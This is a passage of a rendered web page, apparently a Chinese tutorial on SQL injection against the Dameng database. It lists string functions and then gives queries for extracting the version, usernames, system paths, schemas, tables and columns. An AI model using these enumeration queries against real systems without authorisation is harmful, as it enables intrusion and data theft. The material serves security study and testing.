+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">UNHEX</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w">			</span><span class="err">返回对应的字符串，</span><span class="n">unhex</span><span class="p">(</span><span class="mi">3132</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">12</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="32-字符串截取" class="heading-element"><span>3.2 字符串截取</span>
+  <a href="#32-%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%88%aa%e5%8f%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">substring</span><span class="p">(</span><span class="s1">&#39;1234&#39;</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w">			</span><span class="c1">-- 同substr函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">substr</span><span class="p">(</span><span class="s1">&#39;1234&#39;</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w">				</span><span class="c1">-- 返回2，第二个参数从第几位开始取值，第三个参数代表截图多少位
+</span></span></span><span class="line"><span class="cl"><span class="c1">-- 多种格式 SUBSTR(str,pos)、SUBSTR(str FROM pos)、SUBSTR(str,pos,len)、SUBSTR(str FROM pos FOR len), 如 substr(&#39;1234&#39; from 2 for 1) = 2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">left</span><span class="p">(</span><span class="s1">&#39;123456&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w">					</span><span class="c1">-- 返回123，第二个参数代表返回左边几位的字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">right</span><span class="p">(</span><span class="s1">&#39;123456&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w">				</span><span class="c1">-- 返回456，第二个参数代表返回右边几位的字符</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="33-字符串拼接" class="heading-element"><span>3.3 字符串拼接</span>
+  <a href="#33-%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%8b%bc%e6%8e%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">||</span><span class="w">																</span><span class="c1">-- 将左右两侧字符串进行连接
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">CONCAT</span><span class="p">(</span><span class="n">str1</span><span class="p">,</span><span class="n">str2</span><span class="p">...)</span><span class="w">									</span><span class="c1">-- 将多个字符串合并为一个字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">CONCAT_WS</span><span class="p">(</span><span class="n">separator</span><span class="p">,</span><span class="n">str1</span><span class="p">,</span><span class="n">str2</span><span class="p">...)</span><span class="w">				</span><span class="c1">-- 通过分隔符separator将字符串连接在一起
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">WM_CONCAT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w">							</span><span class="c1">-- 类似 GROUP_CONCAT(...)，将某一列中的多个字符串按照一定顺序拼接成一个大的字符串，通常用于分组后的字符串拼接
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">LISTAGG</span><span class="p">(</span><span class="k">column_name</span><span class="p">,</span><span class="w"> </span><span class="n">separator</span><span class="p">)</span><span class="w">					</span><span class="c1">-- 和 WM_CONCAT 类似，也是用于将分组后的列值进行拼接，并且提供了更多的控制选项，如指定分隔符等。</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="34-其他" class="heading-element"><span>3.4 其他</span>
+  <a href="#34-%e5%85%b6%e4%bb%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">LENGTH</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w">		</span><span class="c1">-- 返回字符串的长度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">len</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w">			</span><span class="c1">-- 返回字符串的长度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">LOWER</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w">		</span><span class="c1">-- 将字符串字母全部转成小写。同：LCASE(str)。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">UPPER</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w">		</span><span class="c1">-- 将字符串字母全部转成大写。同：UCASE(str)。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">TO_CHAR</span><span class="p">(</span><span class="nb">date</span><span class="o">/</span><span class="n">time_value</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;format&#39;</span><span class="p">)</span><span class="w">   	</span><span class="c1">-- 将日期、时间、数字等类型的数据转换为字符类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">TO_NUMBER</span><span class="p">(</span><span class="n">char_value</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;format&#39;</span><span class="p">)</span><span class="w">			 </span><span class="c1">-- 将字符类型的数据转换为数字类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">TO_DATE</span><span class="p">(</span><span class="n">char_value</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;format&#39;</span><span class="p">)</span><span class="w">				 </span><span class="c1">-- 将字符类型的数据转换为日期类型。</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x04-sqli-获取数据" class="heading-element"><span>0x04 SQLi 获取数据</span>
+  <a href="#0x04-sqli-%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>注入方式整体上和Oracle差不多，但是还是有一些区别。</p>
+<p>注入语句：</p>
+<h3 id="41-基本信息" class="heading-element"><span>4.1 基本信息</span>
+  <a href="#41-%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="c1">-- 查看数据库版本
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">banner</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="p">;</span><span class="w">			</span><span class="c1">-- 注意：返回是多行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">banner</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">WM_CONCAT</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="w">  	</span><span class="c1">-- 在一行中显示
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">LISTAGG</span><span class="p">(</span><span class="n">banner</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;， &#39;</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span><span class="p">;</span><span class="w">  	</span><span class="c1">-- 在一行中显示，高版本可用
+</span></span></span><span class="line"><span class="cl"><span class="c1">-- 获取当前用户、当前数据库
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">DUAL</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">cur_database</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 获取所有用户名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">USERNAME</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">ALL_USERS</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">WM_CONCAT</span><span class="p">(</span><span class="n">USERNAME</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">ALL_USERS</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="42-查询全局变量" class="heading-element"><span>4.2 查询全局变量</span>
+  <a href="#42-%e6%9f%a5%e8%af%a2%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>需要当前用户具备查询权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="k">TYPE</span><span class="p">,</span><span class="w"> </span><span class="n">VALUE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">V$PARAMETER</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>NAME</code>列显示系统参数的名称，如<code>BUFFER_POOL_SIZE</code>（缓冲池大小）等，这些参数名称用于标识不同的数据库配置项。</li>
+<li><code>TYPE</code>列表示参数的类型，例如<code>INT</code>（整数类型）、<code>STRING</code>（字符串类型）等，这有助于了解参数值的数据格式。</li>
+<li><code>VALUE</code>列则是对应的参数实际的值，例如对于<code>BUFFER_POOL_SIZE</code>参数，<code>VALUE</code>列可能显示一个表示大小的数字（单位可能根据参数定义而不同）。</li>
+</ul>
+<p>常见有用的全局变量如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">NAME									VALUE
+</span></span><span class="line"><span class="cl">SYSTEM_PATH				/home/dmdba/data/DAMENG
+</span></span><span class="line"><span class="cl">CONFIG_PATH				/home/dmdba/data/DAMENG
+</span></span><span class="line"><span class="cl">TEMP_PATH					/home/dmdba/data/DAMENG
+</span></span><span class="line"><span class="cl">BAK_PATH					/home/dmdba/data/DAMENG/bak
+</span></span><span class="line"><span class="cl">DFS_PATH					$/DAMENG
+</span></span><span class="line"><span class="cl">INSTANCE_NAME			DMSERVER
+</span></span><span class="line"><span class="cl">INSTANCE_ADDR
+</span></span><span class="line"><span class="cl">PORT_NUM					5236
+</span></span><span class="line"><span class="cl">SVR_LOG_NAME			SLOG_ALL
+</span></span><span class="line"><span class="cl">TRACE_PATH				/home/dmdba/data/DAMENG/trace
+</span></span><span class="line"><span class="cl">BCT_PATH					/home/dmdba/data/DAMENG</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果只想查询特定的全局变量，可以在查询语句中添加筛选条件。
+查询语句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">VALUE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">V$PARAMETER</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;SYSTEM_PATH&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">VALUE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">V$PARAMETER</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%INSTANCE%&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="43-查询系统表" class="heading-element"><span>4.3 查询系统表</span>
+  <a href="#43-%e6%9f%a5%e8%af%a2%e7%b3%bb%e7%bb%9f%e8%a1%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="1-查询库名" class="heading-element"><span>1） 查询库名</span>
+  <a href="#1-%e6%9f%a5%e8%af%a2%e5%ba%93%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><code>SYS.SYSOBJECTS</code>表中保存全部的库名信息。
+查询所有的库名和对应ID</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">NAME</span><span class="p">,</span><span class="n">ID</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">SYSOBJECTS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">TYPE</span><span class="err">$</span><span class="o">=</span><span class="s1">&#39;SCH&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2-查询表名" class="heading-element"><span>2） 查询表名</span>
+  <a href="#2-%e6%9f%a5%e8%af%a2%e8%a1%a8%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><code>SYS.SYSOBJECTS</code> 表中同时保存全部的表名信息。
+查询所有的表名。其中SCHID来自步骤1）中获得的ID</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">NAME</span><span class="p">,</span><span class="n">ID</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">SYSOBJECTS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">TYPE</span><span class="err">$</span><span class="o">=</span><span class="s1">&#39;SCHOBJ&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">SUBTYPE$</span><span class="o">=</span><span class="s1">&#39;UTAB&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">SCHID</span><span class="o">=</span><span class="mi">150995949</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3-查询列名" class="heading-element"><span>3） 查询列名</span>
+  <a href="#3-%e6%9f%a5%e8%af%a2%e5%88%97%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><code>SYS.SYSCOLUMNS</code> 表中字段名称和字段类型。
+查询所有表对应的列名。其中ID为步骤2）中获取的ID</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">NAME</span><span class="p">,</span><span class="k">TYPE</span><span class="err">$</span><span class="p">,</span><span class="n">DEFVAL</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">SYS</span><span class="p">.</span><span class="n">SYSCOLUMNS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">ID</span><span class="o">=</span><span class="mi">1078</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="44-查询视图" class="heading-element"><span>4.4 查询视图</span>
+  <a href="#44-%e6%9f%a5%e8%af%a2%e8%a7%86%e5%9b%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="1-查询用户" class="heading-element"><span>1） 查询用户</span>
+  <a href="#1-%e6%9f%a5%e8%af%a2%e7%94%a8%e6%88%b7" class="heading-mark">
